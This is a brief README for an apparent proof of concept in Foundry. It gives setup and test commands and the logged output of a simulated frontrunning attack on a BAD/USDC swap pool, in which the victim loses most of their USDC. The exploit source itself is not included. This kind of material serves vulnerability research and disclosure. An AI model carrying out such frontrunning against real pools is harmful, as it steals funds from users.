# PoC

The PoC code can be found in [`./test/Hack.t.sol`](./test/Hack.t.sol).

### Setup

```
$ forge install
```

Create an `.env` file with your Alchemy API key:
```
ALCHEMY_API_KEY=<key>
```

### Running the tests

```
$ forge test --via-ir -vv
```

Output:

```
[PASS] testHack() (gas: 7593896)
Logs:
  Creating BAD / USDC pool

  Initial price is 1000 USDC per BAD token

  Victim wants to swap 0.01 BAD for at most 11 USDC
  Attacker frontruns and increases the price of BAD

  Price before swap (in USDC) 999
  ATTACKER SWAPS...
  Price after swap (in USDC) 990249


  Victim's USDC balance before swap 1000000
  VICTIM SWAPS...
  Victim's USDC balance after swap 8268
```
